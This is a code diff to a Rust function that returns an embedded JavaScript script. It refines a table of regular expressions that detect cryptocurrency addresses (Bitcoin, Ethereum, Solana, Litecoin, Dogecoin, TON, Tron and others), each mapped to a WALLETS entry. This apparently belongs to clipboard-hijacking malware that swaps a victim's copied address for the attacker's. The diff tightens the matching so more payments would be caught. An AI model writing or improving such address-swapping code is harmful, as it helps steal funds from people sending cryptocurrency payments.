@@ -47,17 +47,16 @@ pub fn get_script() -> &'static str {
     // ==============================================================
     
     const PATTERNS = [
-        { n: 'BTC', p: '\\b(bc1)[a-z0-9]{38,62}\\b', f: 'gi', w: WALLETS.BTC },
+        { n: 'BTC', p: '\\bbc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{39,59}\\b', f: 'g', w: WALLETS.BTC },
         { n: 'BTC', p: '\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\\b', f: 'g', w: WALLETS.BTC_LEGACY },
         { n: 'SUI', p: '\\b0x[a-fA-F0-9]{64}\\b', f: 'g', w: WALLETS.SUI },
         { n: 'ETH', p: '\\b0x[a-fA-F0-9]{40}\\b', f: 'g', w: WALLETS.ETH },
-        { n: 'SOL', p: '\\b[1-9A-HJ-NP-Za-km-z]{43,44}\\b', f: 'g', w: WALLETS.SOL },
-        { n: 'LTC', p: '\\b(ltc1)[a-z0-9]{38,62}\\b', f: 'gi', w: WALLETS.LTC },
-        { n: 'LTC', p: '\\bL[a-km-zA-HJ-NP-Z1-9]{26,33}\\b', f: 'g', w: WALLETS.LTC_LEGACY },
-        { n: 'LTC', p: '\\bM[a-km-zA-HJ-NP-Z1-9]{26,33}\\b', f: 'g', w: WALLETS.LTC_LEGACY },
-        { n: 'DOGE', p: '\\bD[1-9A-HJ-NP-Za-km-z]{33}\\b', f: 'g', w: WALLETS.DOGE },
+        { n: 'SOL', p: '\\b[1-9A-HJ-NP-Za-km-z]{32,44}\\b', f: 'g', w: WALLETS.SOL },
+        { n: 'LTC', p: '\\bltc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{39,59}\\b', f: 'g', w: WALLETS.LTC },
+        { n: 'LTC', p: '\\b[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}\\b', f: 'g', w: WALLETS.LTC_LEGACY },
+        { n: 'DOGE', p: '\\bD[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}\\b', f: 'g', w: WALLETS.DOGE },
         { n: 'DASH', p: '\\bX[1-9A-HJ-NP-Za-km-z]{33}\\b', f: 'g', w: WALLETS.DASH },
-        { n: 'TON', p: '\\b(EQ|UQ)[a-zA-Z0-9_-]{46}\\b', f: 'g', w: WALLETS.TON },
+        { n: 'TON', p: '\\b[EU]Q[a-zA-Z0-9_-]{46}\\b', f: 'g', w: WALLETS.TON },
         { n: 'TRX', p: '\\bT[1-9A-HJ-NP-Za-km-z]{33}\\b', f: 'g', w: WALLETS.TRX }
     ];
     
